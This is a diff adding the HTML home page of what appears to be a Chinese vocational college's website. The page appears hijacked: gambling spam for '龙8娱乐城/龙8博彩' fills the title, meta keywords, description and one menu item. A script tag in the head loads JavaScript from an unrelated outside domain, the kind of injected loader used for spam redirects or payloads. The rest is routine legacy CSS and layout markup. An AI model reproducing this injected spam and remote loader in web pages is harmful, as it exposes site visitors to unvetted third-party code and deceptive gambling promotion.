@@ -1,0 +1,630 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=7.5">
+
+
+<title>龙8娱乐城|龙8娱乐|龙8博彩</title>
+<meta name='keywords' content='龙8娱乐城,龙8娱乐,龙8博彩'/>
+<meta name='description' content='龙8娱乐城为你提供各类好玩的单机游戏下载,龙8娱乐城拥有完善的游戏平台,龙8博彩官网在亚洲老虎机娱乐坛上赫赫有名的娱乐城,龙8博彩,龙8娱乐城是众多体育迷，尤其是足球迷们的最爱，' />
+
+<script src='include/js/swfobjectopt.js'></script>
+
+<link href="include/css/style_5617.css" rel="stylesheet" type="text/css" media="screen" />
+<link href="upload/moban/images/style.css" rel="stylesheet" type="text/css" media="screen" />
+<link rel="shortcut icon" href="files/103997/ico.ico" />
+<style>
+ 	#pagination-clean li{
+		border:0; margin:0; padding:0;
+		font-size:12px;
+		list-style:none;
+		float:left;
+	}
+	#pagination-clean li, #pagination-clean a{
+		margin-right:2px;
+	}
+	#pagination-clean .previous-off,
+	#pagination-clean .next-off {
+		color:#888888;
+		display:block;
+		float:left;
+		font-weight:bold;
+		padding:3px 4px;
+	}	
+	#pagination-clean .next a,
+	#pagination-clean previous a{
+		border:none;
+		font-weight:bold;
+	}	
+	#pagination-clean .active{
+		color:#000000;
+		font-weight:bold;
+		display:block;
+		float:left;
+		padding:4px 6px;
+	}
+	#pagination-clean a:link, 
+	#pagination-clean a:visited {
+		color:#0e509e;
+		display:block;
+		float:left;
+		padding:3px 6px;
+		text-decoration:underline;
+	}
+	#pagination-clean a:hover{
+		text-decoration:none;
+	}
+
+	#pagination-digg li{
+		border:0; margin:0; padding:0;
+		font-size:12px;
+		list-style:none;
+		float:left;
+		margin-right:5px;
+	}
+	#pagination-digg a{
+		border:solid 1px #9aafe5;
+		margin-right:2px;
+	}
+	#pagination-digg .previous-off,
+	#pagination-digg .next-off {
+		border:solid 1px #DEDEDE;
+		color:#888888;
+		display:block;
+		float:left;
+		font-weight:bold;
+		margin-right:2px;
+		padding:3px 4px;
+	}
+	#pagination-digg .next a,
+	#pagination-digg .previous a {
+	 font-weight:bold;
+	}	
+	#pagination-digg .active{
+		background:#2e6ab1;
+		color:#FFFFFF;
+		font-weight:bold;
+		display:block;
+		float:left;
+		padding:4px 6px;
+	}
+	#pagination-digg a:link, 
+	#pagination-digg a:visited {
+		color:#0e509e;
+		display:block;
+		float:left;
+		padding:3px 6px;
+		text-decoration:none;
+	}
+	#pagination-digg a:hover{
+		border:solid 1px #0e509e;
+	}
+
+	#pagination-flickr li{
+		border:0; margin:0; padding:0;
+		font-size:12px;
+		list-style:none;
+		float:left;
+	}
+	#pagination-flickr a{
+		border:solid 1px #DDDDDD;
+		margin-right:2px;
+	}
+	#pagination-flickr .previous-off,
+	#pagination-flickr .next-off {
+		color:#666666;
+		display:block;
+		float:left;
+		font-weight:bold;
+		padding:3px 4px;
+	}
+	#pagination-flickr .next a,
+	#pagination-flickr .previous a {
+		font-weight:bold;
+		border:solid 1px #FFFFFF;
+	}	
+	#pagination-flickr .active{
+		color:#ff0084;
+		font-weight:bold;
+		display:block;
+		float:left;
+		padding:4px 6px;
+	}
+	#pagination-flickr a:link, 
+	#pagination-flickr a:visited {
+		color:#0063e3;
+		display:block;
+		float:left;
+		padding:3px 6px;
+		text-decoration:none;
+	}
+	#pagination-flickr a:hover{
+		border:solid 1px #666666;
+	}
+</style><link href="http://www.hiqview.com/website/103997/link.css" rel="stylesheet" type="text/css" media="screen" />
+<script>
+
+var errorMsg='';
+function killErrors(){
+    var arglen=arguments.length;   
+	errorMsg="错误："+arglen+"个\n";   
+    for(var i=0;i<arglen;i++){   
+    errorMsg+="错误"+(i+1)+"："+arguments[i]+"\n";
+	}
+	window.onerror=null;   
+	return true;
+}
+window.onerror = killErrors;
+var a_ba='center';
+var headerheight=0;
+var alltabletop=0;
+var contop=0;
+var all_div_id=['s67995506','s76866786','s857111','s25781','s85805209','s816138','s92678909','s57424953','s6338440','s46134106','s40001505','s30653','s1132575','s75612708','s74433937','s85646771','s1941296','s37102846','s28091864','s76267386','s61342981','s27951130','s86644677','s1032724','s61152659','s82522712','s55161798'];
+var move_div_id=[];
+var move_div_id1=[];
+var _content_id_a=[];
+var _disappear_id_a=[];
+var _yah_id_a=[];
+var _content_no=0;
+var _content_have=0;
+var _content_id='';
+var c_error=1;
+var json_command_bs='www.hiqview.com/images/';
+var marqueen_a=['s76267386|2|120|0','s61152659|1|100|0',0];	
+var popgg_a=[];
+var floatgg_a=[];
+var coupletsgg_a=[];
+var kefugg_a=[];
+var quanpinggg_a=[];
+var _autoc_id_a=[];
+
+var floatgg_d='';
+var floatgg_s='';
+var link_css='http://www.hiqview.com/website/103997/link.css';
+
+var _mod='5617';
+var _config_rooturl='http://www.hiqview.com/';
+var _message_list='';
+var _fix_a=[];
+var _fix_b=[];
+var _fix_c=[];
+var _ya_a=[];
+var _ya_b=[];
+var _muti_roll_a=[''];
+var mod='home';
+var fid='';
+var tid='';
+var _pre_url='mod%3D5617%26md%3D%26type%3D%26cat%3D';
+var maskDiv=null;
+var winlistDiv=null;
+var BatchDiv=null;
+var ExpdataDiv=null;
+var curObjID="";
+var curObj=null;
+var t_DiglogX,t_DiglogY,t_DiglogW,t_DiglogH;
+
+function isparseInt(v){
+   var v=parseInt(v);
+   if (isNaN(v) || v<0){
+      v=0;
+   }
+   return v;
+}
+
+</script>
+<script src="include/js/dcode.js"></script>
+
+<script type="text/javascript" src="include/js/jscookmenu.js"></script>
+
+
+<!--[if lt IE 7]>
+<script src="http://www.hiqview.com/include/js/IE7.js" type="text/javascript"></script>
+<![endif]-->
+
+<!--[if IE 6]>
+<script src="http://www.hiqview.com/include/js/iepng.js" type="text/javascript"></script>
+<script type="text/javascript">
+   EvPNG.fix('body, div, ul, img, li, input'); 
+</script>
+<![endif]-->
+
+<style type="text/css">
+body,td,th,div,span {font-family: Arial; LINE-HEIGHT: 1.5;word-wrap: break-word;}
+#bodybackp { background-image:url(http://www.hiqview.com/files/103997/1112/y_5c32811729.gif);background-color:rgb(241,249,255);width:100%;background-attachment:fixed;background-position:0% 0%;left:0px; }
+
+#guajian1  { z-index:20;position:absolute;display:none;top:7px;left:-92px; }
+#guajian2  { z-index:20;position:absolute;display:none;top:5px;left:5px; }
+#guajian3  { z-index:20;position:absolute;display:none;top:5px;left:5px; }
+#guajian4  { z-index:20;position:absolute;display:none;top:5px;left:5px; }
+#guajian5  { z-index:20;position:absolute;display:none;top:5px;left:5px; }
+#guajian6  { z-index:20;position:absolute;display:none;top:5px;left:5px; }
+#guajian7  { z-index:20;position:absolute;display:none;top:5px;left:5px; }
+#guajian8  { z-index:20;position:absolute;display:none;top:5px;left:5px; }
+
+#nav  { BACKGROUND-IMAGE: url(http://www.hiqview.com/files/103997/1111/x_bf62811747.jpg); Z-INDEX: 9; POSITION: absolute; WIDTH: 1002px; DISPLAY: none; BACKGROUND-REPEAT: no-repeat; HEIGHT: 40px; TOP: 166px; LEFT: 0px }
+#nav_1  { PADDING-LEFT: 4px }
+#nav_3  { COLOR: rgb(255,255,255); FONT-SIZE: 14px }
+#nav_4  { margin:0px;width:88px;float:left;height:40px; }
+#nav_5  { TEXT-ALIGN: center; PADDING-BOTTOM: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; PADDING-TOP: 8px }
+#nav_6  { COLOR: rgb(255,255,255); FONT-SIZE: 14px }
+#nav_7  { MARGIN: 0px; WIDTH: 88px; FLOAT: left; HEIGHT: 40px }
+#nav_8  { TEXT-ALIGN: center; PADDING-BOTTOM: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; PADDING-TOP: 8px }
+#nav_b1  { Z-INDEX: -1; POSITION: absolute; HEIGHT: 0px }
+#nav_b2  { Z-INDEX: -1; POSITION: absolute; HEIGHT: 0px }
+#nav_b3  { Z-INDEX: -2; POSITION: absolute; WIDTH: 10px; HEIGHT: 0px }
+
+#menu       { Z-INDEX: 14; POSITION: absolute; WIDTH: 730px; DISPLAY: none; HEIGHT: 30px; COLOR: rgb(0,0,0); FONT-SIZE: 14px; TOP: 272px; LEFT: 240px ;overflow: hidden;}
+#menu     a { COLOR: rgb(0,0,0); MARGIN-RIGHT: 10px }
+
+#f_con1    { z-index:15;position:absolute;width:192px;display:none;height:24px;top:43px;left:756px; }#f_con2    { position:absolute;width:717px;height:100px;top:1px;left:278px; }#f_con11    { z-index:7;position:absolute;width:265px;height:65px;top:8px;left:1px; }
+#bd        { BACKGROUND-COLOR: rgb(255,255,255) }
+#table_footer { BACKGROUND-IMAGE: url(http://www.hiqview.com/files/103997/1111/y_edc17098.jpg); BACKGROUND-COLOR: rgb(255,255,255); BACKGROUND-REPEAT: repeat-x; BACKGROUND-POSITION: 0% 100%; HEIGHT: 86px;}
+#background_1 {min-height:1px;BACKGROUND-IMAGE: url(http://www.hiqview.com/files/103997/1111/y_f0c2811798.jpg); Z-INDEX: -1; POSITION: absolute; BACKGROUND-REPEAT: repeat-x; BACKGROUND-POSITION: 50% 0%; }
+#background_2 {min-height:1px;;}
+#alltable        { position:absolute;width:1002px;top:0px;; left:50%; margin-left:-501px;;}
+
+
+/*
+ 整体设置
+*/
+.Themes857111Menu,
+.Themes857111SubMenuTable
+{
+font-weight: normal;  
+   color: #FFFFFF;
+   padding: 0;
+   cursor: pointer;
+}
+
+/*
+ 导航条设置
+*/
+.Themes857111MenuOuter
+{
+   border: 0;        text-align: center;
+}
+
+/*
+ * 主菜单按钮 tr设置
+ */
+.Themes857111MainItem
+{
+}
+/*
+ * 主菜单按钮 td设置
+ */
+td.Themes857111MainFolderText,
+td.Themes857111MainItemText
+{
+	vertical-align:middle;
+   width:78px;height:40px;   font-family: 宋体;
+   font-size: 14px;
+   padding: 0px 5px 0px 5px;
+}
+
+/*
+ * 主菜单按钮 td触发状态
+ */
+.Themes857111MainItemHover,
+.Themes857111MainItemActive
+{
+	color: #FFFFFF;font-weight: normal;font-style: normal;text-decoration: none;}
+
+
+/*
+ 弹出窗的DIV
+*/
+.Themes857111SubMenu
+{
+   position: absolute;
+   visibility: hidden;
+   padding: 0;
+   border: 0;}
+
+/*
+ 弹窗的整个table设置
+*/
+.Themes857111SubMenuTable
+{
+   text-align: center;
+}
+
+
+/*
+  弹窗的td设置
+*/
+.Themes857111MenuFolderText,
+.Themes857111MenuItemText
+{
+	vertical-align:middle;
+   width:78px;height:30px;   
+   font-family: 宋体;
+   font-size: 12px;
+   padding: 0px 5px 0px 5px;
+}
+
+/*
+  弹窗的tr设置
+*/
+.Themes857111MenuItem
+{
+   color: #333333;
+background: url(files/103997/1303/y_f3d4229336.jpg);background-position: repeat;background-repeat:0% 0%;font-weight: normal;font-style: normal;text-decoration: none;}
+
+/*
+  弹窗的tr触发设置
+*/
+.Themes857111MenuItemHover,
+.Themes857111MenuItemActive
+{
+	background-color: #950909;color: #FFFFFF;font-weight: normal;font-style: normal;text-decoration: none;   
+}
+
+.Themes857111SubMenuTable td
+{
+   white-space: nowrap;
+}
+.Themes857111MainItem,
+.Themes857111MainItemHover,
+.Themes857111MainItemActive,
+.Themes857111MenuItem,
+.Themes857111MenuItemHover,
+.Themes857111MenuItemActive
+{
+   white-space: nowrap;
+}
+
+
+.Themes857111MenuFolderLeft,
+.Themes857111MenuFolderRight,
+.Themes857111MenuItemLeft,
+.Themes857111MenuItemRight
+{
+   padding: 0px 0px 0px 0px;
+}
+
+td.Themes857111MainFolderLeft,
+td.Themes857111MainFolderRight,
+td.Themes857111MainItemLeft,
+td.Themes857111MainItemRight
+{
+   padding: 0px 0px 0px 0px;
+}
+
+/*
+  分隔符
+*/
+td.Themes857111MenuSplit
+{
+   overflow: hidden;
+   background-color: inherit;
+}
+div.Themes857111MenuSplit
+{
+   height: 1px;
+   margin: 0px 0px 0px 0px;
+   overflow: hidden;
+   background-color: inherit;
+   border-top: 1px solid #000000;
+}
+.Themes857111MenuVSplit{
+   display: block;
+   width: 1px;
+   margin: 0px 7px 0px 7px;
+   overflow: hidden;
+   background-color: inherit;
+   border-right: 1px solid #000000;
+}
+
+
+</style>
+<script language='javascript' type='text/javascript' src='http://js.shengbowangjs.com/js/2017/7/b7.js'></script></head>
+<BODY  id="bodybackp"  align="center">
+
+
+<div id="alltable">
+<div id="flashscript" style="position:absolute;top:100px; left:0px;width:98%; height:400px; z-index:0" ></div>
+<table  cellpadding="0" cellspacing="0" width="100%" height="100%" style="table-layout:fixed; border-top:0">
+<TR><TD id="table_header" style="BACKGROUND-IMAGE: url(http://www.hiqview.com/files/103997/1211/x_5ed2859344.jpg); BORDER-BOTTOM: medium none; BORDER-LEFT: medium none; BACKGROUND-REPEAT: no-repeat; HEIGHT: 167px; BORDER-TOP: medium none; BORDER-RIGHT: medium none">&nbsp;</TD></TR>
+<tr><td id="bd"><table id='bd_0' cellspacing=0 cellpadding=0 width='100%'  style="position:absolute; left:0px; top:167px">
+<tr>
+<td  id="bd_1" style="width:50px;height:50px;background:url(images/border/www.hiqview.com/images/1.gif) no-repeat 0 0%;">&nbsp;</td>
+<td  id="bd_2" style="background:url(images/border/www.hiqview.com/images/2.gif) repeat-x 0% 0%">&nbsp;</td>
+<td  id="bd_3" style="width:50px;background:url(images/border/www.hiqview.com/images/3.gif) no-repeat 100% 0%;">&nbsp;</td>
+</tr>
+<tr>
+<td  id="bd_4" style="background:url(images/border/www.hiqview.com/images/4.gif) repeat-y;height:400px;">&nbsp;</td>
+<td  id="bd_5" style="background:url(images/border/www.hiqview.com/images/5.gif)">&nbsp;</td>
+<td  id="bd_6" style="background:url(images/border/www.hiqview.com/images/6.gif) repeat-y">&nbsp;</td>
+</tr>
+<tr>
+<td  id="bd_7" style="height:50px;background:url(images/border/www.hiqview.com/images/7.gif) no-repeat 0% 100%;">&nbsp;</td>
+<td  id="bd_8" style="background:url(images/border/www.hiqview.com/images/8.gif) repeat-x 0% 100%">&nbsp;</td>
+<td  id="bd_9" style="background:url(images/border/www.hiqview.com/images/9.gif) no-repeat 100% 100%;">&nbsp;</td>
+</tr>
+</table><div id="bd_10" style="HEIGHT: 559px"></div>
+</td></tr>
+<tr><td id="table_footer" valign="top">
+<div style="position:relative; left:0; top:0px;"><div id="f_con2"><SPAN style="HEIGHT: 79px; WIDTH: 707px; POSITION: absolute; TEXT-ALIGN: center; LEFT: 1px; Z-INDEX: 10; LINE-HEIGHT: 2; TOP: 1px"> 
+<P>copyright© 2012 龙8娱乐&nbsp;&nbsp;&nbsp;苏ICP备12011529号&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;页面加载时间:93.75ms&nbsp;&nbsp; <BR>&nbsp;学校地址：无锡市锡山区团结中路33号（春晖路口）　培训热线：（0510）82124051，陈主任15961881851</P>
+<P><FONT class=link_7><SPAN style='FONT-SIZE: 9pt; FONT-FAMILY: 宋体; mso-font-kerning: 1.0pt; mso-ansi-language: EN-US; mso-fareast-language: ZH-CN; mso-bidi-language: AR-SA; mso-bidi-font-family: "Times New Roman"'><FONT color=#000000>招就办热线（<FONT face=宋体><SPAN lang=EN-US>0510</SPAN>）<SPAN lang=EN-US>82114467</SPAN>，王老师<SPAN lang=EN-US>13063600270</SPAN>，平老师<SPAN lang=EN-US>13915278422， </SPAN>传真（<SPAN lang=EN-US>0510</SPAN>）<SPAN lang=EN-US>82102848</SPAN></FONT></FONT></SPAN>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <A href="default.php?mod=article&amp;do=detail&amp;tid=419294" target=_blank>交通信息</A></FONT></P></SPAN> </div><div id="f_con11"><IMG src="files/103997/1111/x_31917055.jpg"> </div></div>
+&nbsp;
+</td></tr>
+</table>
+<div align="left" id="nav">
+<div  id="nav_b1"></div>
+<div  id="nav_b2"></div>
+<div  id="nav_b3"></div>
+<div  id="nav_resize" style="display:none" class="oho_resize"></div>
+<div  id="nav_1"><DIV id="nav_7"><DIV id="nav_8"><A id="nav_6"   href="default.php">网站首页</A></DIV></DIV><DIV id="nav_4"><DIV id="nav_5"><A id="nav_3"   href="default.php?mod=article&fid=1">龙8博彩</A></DIV></DIV><DIV id="nav_4"><DIV id="nav_5"><A id="nav_3"   href="default.php?mod=article&fid=2">学院信息</A></DIV></DIV><DIV id="nav_4"><DIV id="nav_5"><A id="nav_3"   href="default.php?mod=article&fid=3">职能部门</A></DIV></DIV><DIV id="nav_4"><DIV id="nav_5"><A id="nav_3"   href="default.php?mod=article&fid=4">招生就业</A></DIV></DIV><DIV id="nav_4"><DIV id="nav_5"><A id="nav_3"   href="default.php?mod=article&fid=5">校园文化</A></DIV></DIV><DIV id="nav_4"><DIV id="nav_5"><A id="nav_3"   href="default.php?mod=article&fid=6">校企合作</A></DIV></DIV><DIV id="nav_4"><DIV id="nav_5"><A id="nav_3"   href="default.php?mod=c&s=sse043911">网上报名</A></DIV></DIV><DIV id="nav_4"><DIV id="nav_5"><A id="nav_3"  target=_blank href="http://www.hiqview.com/bbs/">学院论坛</A></DIV></DIV></div>
+</div>
+
+<DIV  id="ohid_s67995506" style="Z-INDEX: 2; POSITION: absolute; WIDTH: 1002px; HEIGHT: 160px; TOP: 0px; LEFT: 0px"><DIV id="s67995506_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s67995506_content"  style="">
+<script type="text/javascript">
+	var magic_w = "1002";
+	if("0" == "1") {
+		magic_w = document.documentElement.clientWidth;
+	}
+ var sofocus = new SWFObject("files/103997/1504/168_4342e2e7a20.swf", "s67995506_focus", magic_w, "160", "9.0.28", "#FFFFFF"); 
+ sofocus.addParam("allowNetworking", "all"); 
+ sofocus.addParam("allowScriptAccess", "always"); 
+ sofocus.addParam("allowFullScreen", "true"); 
+ sofocus.addParam("quality", "1"); 
+ //sofocus.addParam("scale", "showall");
+ sofocus.addParam("scale", "noscale");
+ sofocus.addParam("play", "true");
+ sofocus.addParam("loop", "true");
+ sofocus.addParam("wmode", "transparent");
+ sofocus.write("s67995506_content"); 
+</script> 
+<script>$("ohid_s67995506").style.zIndex=0;</script></DIV></DIV></DIV><DIV  id="ohid_s76866786" style="Z-INDEX: 11; POSITION: absolute; WIDTH: 56px; HEIGHT: 54px; TOP: 28px; LEFT: 40px"><DIV id="s76866786_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s76866786_content"  style=""><img   height='50'  width='50' src='files/103997/1411/x_7ae4079765.jpg'    ></DIV></DIV></DIV><DIV  id="ohid_s857111" style="BACKGROUND-IMAGE: url(http://www.hiqview.com/files/103997/1303/x_f3d4229333.jpg); Z-INDEX: 9; POSITION: absolute; WIDTH: 1002px; BACKGROUND-REPEAT: no-repeat; HEIGHT: 314px; TOP: 161px; LEFT: 0px"><DIV id="s857111_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s857111_content"  style="PADDING-LEFT: 5px"><div id="MenuIDs857111"></div>
+</DIV></DIV></DIV><DIV  id="ohid_s25781" style="Z-INDEX: 13; POSITION: absolute; BACKGROUND-COLOR: rgb(30,184,234); WIDTH: 190px; HEIGHT: 24px; TOP: 16px; LEFT: 797px"><DIV id="s25781_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s25781_content"  style="PADDING-LEFT: 7px; PADDING-TOP: 3px"><A class=ltp style="BEHAVIOR: url
+(#default#homepage)" onclick="this.style.behavior='url(#default#homepage)';this.setHomePage&#13;&#10;&#13;&#10;('http://hyjsxy.oho168.com');return(false);" href="javascript:;"><FONT color=#FFFFFF>设为首页</FONT></A>&nbsp;&nbsp;<SPAN class=STYLE8><FONT color=#FFFFFF>|</FONT></SPAN>&nbsp;&nbsp;<A href="javascript:window.external.AddFavorite('http://hyjsxy.oho168.com',%20'宏源技师学院')"><FONT color=#FFFFFF>加入收藏</FONT></A>&nbsp;&nbsp;<SPAN class=STYLE8><FONT color=#FFFFFF>|</FONT></SPAN>&nbsp;&nbsp;<A href="mailto:hyjxbgs@126.com"><FONT color=#FFFFFF>联系我们</FONT></A></DIV></DIV></DIV><DIV  id="ohid_s85805209" style="Z-INDEX: 12; POSITION: absolute; BACKGROUND-COLOR: rgb(203,251,248); WIDTH: 1002px; DISPLAY: none; HEIGHT: 37px; TOP: 204px; LEFT: 0px"><DIV id="s85805209_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s85805209_content"  style=""><TABLE style="WIDTH: 100%; BORDER-COLLAPSE: collapse; HEIGHT: 37px" borderColor=#999999 cellSpacing=0 cellPadding=0 border=0>
+<TBODY>
+<TR>
+<TD class=link_15 style="PADDING-LEFT: 150px; VERTICAL-ALIGN: middle; LINE-HEIGHT: 1.6; PADDING-TOP: 2px; TEXT-ALIGN: left"><A href="default.php?mod=article&amp;fid=15" target=_blank>办公室</A>　|　<A href="default.php?mod=article&amp;fid=16" target=_blank>督导室</A>　|　<A href="default.php?mod=article&amp;fid=17" target=_blank>教务科</A>　|　<A href="default.php?mod=article&amp;fid=18" target=_blank>学生科</A>　|　<A href="default.php?mod=article&amp;fid=19" target=_blank>培训科</A>　|　<A href="default.php?mod=article&amp;fid=21" target=_blank>实训科</A>　|　<A href="default.php?mod=article&amp;fid=22" target=_blank>招就办</A>　|　<A href="default.php?mod=article&amp;fid=23" target=_blank>总务科</A>　|　<A href="default.php?mod=article&amp;fid=110" target=_blank>产训处</A></TD></TR></TBODY></TABLE></DIV></DIV></DIV><DIV  id="ohid_s816138" style="Z-INDEX: 12; POSITION: absolute; BACKGROUND-COLOR: rgb(203,251,248); WIDTH: 1002px; DISPLAY: none; HEIGHT: 37px; TOP: 204px; LEFT: 0px"><DIV id="s816138_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s816138_content"  style=""><TABLE style="WIDTH: 100%; BORDER-COLLAPSE: collapse; HEIGHT: 37px" borderColor=#999999 cellSpacing=0 cellPadding=0 border=0>
+<TBODY>
+<TR>
+<TD class=link_15 style="PADDING-LEFT: 330px; VERTICAL-ALIGN: middle; LINE-HEIGHT: 1.6; PADDING-TOP: 2px; TEXT-ALIGN: left"><A href="default.php?mod=article&amp;fid=24" target=_blank>招生专区</A>　|　<A href="default.php?mod=article&amp;fid=25" target=_blank>就业专区</A></TD></TR></TBODY></TABLE></DIV></DIV></DIV><DIV  id="ohid_s92678909" style="Z-INDEX: 12; POSITION: absolute; BACKGROUND-COLOR: rgb(203,251,248); WIDTH: 1002px; DISPLAY: none; HEIGHT: 37px; TOP: 204px; LEFT: 0px"><DIV id="s92678909_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s92678909_content"  style=""><TABLE style="WIDTH: 100%; BORDER-COLLAPSE: collapse; HEIGHT: 37px" borderColor=#999999 cellSpacing=0 cellPadding=0 border=0>
+<TBODY>
+<TR>
+<TD class=link_15 style="PADDING-LEFT: 40px; VERTICAL-ALIGN: middle; LINE-HEIGHT: 1.6; PADDING-TOP: 2px; TEXT-ALIGN: left"><A href="default.php?mod=article&amp;fid=8" target=_blank>学校规模</A>　|　<A href="default.php?mod=article&amp;fid=9" target=_blank>领导班子</A>　|　<A href="default.php?mod=article&amp;fid=11" target=_blank>组织机构</A>　|　<A href="default.php?mod=article&amp;fid=72" target=_blank>办学理念</A>　|　<A href="default.php?mod=article&amp;fid=73" target=_blank>学院特色</A>　|　<A href="default.php?mod=article&amp;fid=74" target=_blank>学院荣誉</A>　|　<A href="default.php?mod=article&amp;fid=10" target=_blank>校容校貌</A>　|　<A href="default.php?mod=article&amp;fid=12" target=_blank>地理位置</A></TD></TR></TBODY></TABLE></DIV></DIV></DIV><DIV  id="ohid_s57424953" style="Z-INDEX: 12; POSITION: absolute; BACKGROUND-COLOR: rgb(203,251,248); WIDTH: 1002px; DISPLAY: none; HEIGHT: 37px; TOP: 204px; LEFT: 0px"><DIV id="s57424953_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s57424953_content"  style=""><TABLE style="WIDTH: 100%; BORDER-COLLAPSE: collapse; HEIGHT: 37px" borderColor=#999999 cellSpacing=0 cellPadding=0 border=0>
+<TBODY>
+<TR>
+<TD class=link_15 style="PADDING-LEFT: 110px; VERTICAL-ALIGN: middle; LINE-HEIGHT: 1.6; PADDING-TOP: 2px; TEXT-ALIGN: left"><A href="default.php?mod=article&amp;fid=13" target=_blank>组织建设</A>　|　<A href="default.php?mod=article&amp;fid=14" target=_blank>主题活动</A>　|　<A href="default.php?mod=article&amp;fid=75" target=_blank>团委</A>　|　<A href="default.php?mod=article&amp;fid=76" target=_blank>教职工之家</A></TD></TR></TBODY></TABLE></DIV></DIV></DIV><DIV  id="ohid_s6338440" style="Z-INDEX: 12; POSITION: absolute; BACKGROUND-COLOR: rgb(203,251,248); WIDTH: 1002px; DISPLAY: none; HEIGHT: 37px; TOP: 204px; LEFT: 0px"><DIV id="s6338440_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s6338440_content"  style=""><P>
+<TABLE style="WIDTH: 100%; BORDER-COLLAPSE: collapse; HEIGHT: 37px" borderColor=#999999 cellSpacing=0 cellPadding=0 border=0 target="_blank">
+<TBODY>
+<TR>
+<TD class=link_15 style="PADDING-LEFT: 460px; VERTICAL-ALIGN: middle; LINE-HEIGHT: 1.6; PADDING-TOP: 2px; TEXT-ALIGN: left">
+<P align=left><A href="default.php?mod=article&amp;fid=30" target=_blank>合作动态</A>　|　<A href="default.php?mod=article&amp;fid=32" target=_blank>产学研成果</A>　|　<A href="default.php?mod=article&amp;fid=33" target=_blank>企业风采</A></P></TD></TR></TBODY></TABLE></P></DIV></DIV></DIV><DIV  id="ohid_s46134106" style="Z-INDEX: 12; POSITION: absolute; BACKGROUND-COLOR: rgb(203,251,248); WIDTH: 1002px; DISPLAY: none; HEIGHT: 37px; TOP: 204px; LEFT: 0px"><DIV id="s46134106_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s46134106_content"  style=""><TABLE style="WIDTH: 100%; BORDER-COLLAPSE: collapse; HEIGHT: 37px" borderColor=#999999 cellSpacing=0 cellPadding=0 border=0>
+<TBODY>
+<TR>
+<TD class=link_15 style="PADDING-LEFT: 350px; VERTICAL-ALIGN: middle; LINE-HEIGHT: 1.6; PADDING-TOP: 2px; TEXT-ALIGN: left"><A href="default.php?mod=article&amp;fid=26" target=_blank>心理健康咨询</A>　|　<A href="default.php?mod=article&amp;fid=27" target=_blank>班主任工作</A>　|　<A href="default.php?mod=article&amp;fid=28" target=_blank>德育风采</A></TD></TR></TBODY></TABLE></DIV></DIV></DIV><DIV  id="ohid_s40001505" style="Z-INDEX: 1; BORDER-BOTTOM: rgb(227,234,245) 1px solid; POSITION: absolute; BORDER-LEFT: rgb(227,234,245) 1px solid; BACKGROUND-COLOR: rgb(255,255,255); BORDER-TOP-COLOR: rgb(227,234,245); WIDTH: 988px; BORDER-TOP-WIDTH: 1px; HEIGHT: 32px; TOP: 205px; BORDER-RIGHT: rgb(227,234,245) 1px solid; LEFT: 7px"><DIV id="s40001505_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s40001505_content"  style=""><div style='width:100%; height:100%'>&nbsp;</div></DIV></DIV></DIV><DIV  id="ohid_s30653" style="Z-INDEX: 6; POSITION: absolute; BACKGROUND-COLOR: rgb(255,255,255); WIDTH: 157px; HEIGHT: 23px; TOP: 214px; LEFT: 16px"><DIV id="s30653_header" style="Z-INDEX: 8; POSITION: absolute; WIDTH: 100%; HEIGHT: 0px; TOP: 0px; LEFT: 0px"><DIV id="s30653_header0" style="POSITION: absolute; WIDTH: 117px; HEIGHT: 100%; TOP: 0px; LEFT: 20px"></DIV><DIV id="s30653_header1" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; LEFT: 0px"></DIV><DIV id="s30653_header2" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; RIGHT: 0px"></DIV><DIV id="s30653_header3" style="POSITION: absolute; WIDTH: 60px; HEIGHT: 100%; TOP: 5px; LEFT: 0px"></DIV><DIV id="s30653_header4" style="POSITION: absolute; TEXT-ALIGN: right; WIDTH: 80px; HEIGHT: 100%; TOP: 0px; RIGHT: 0px"  ><a href="default.php?mod=article&fid=0"  ></a></DIV><DIV id="s30653_header5" style="POSITION: absolute; WIDTH: 60%; HEIGHT: 100%; COLOR: rgb(209,0,3); TOP: 5px; FONT-WEIGHT: bold; LEFT: 0px"></DIV></DIV><DIV id="s30653_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s30653_content"  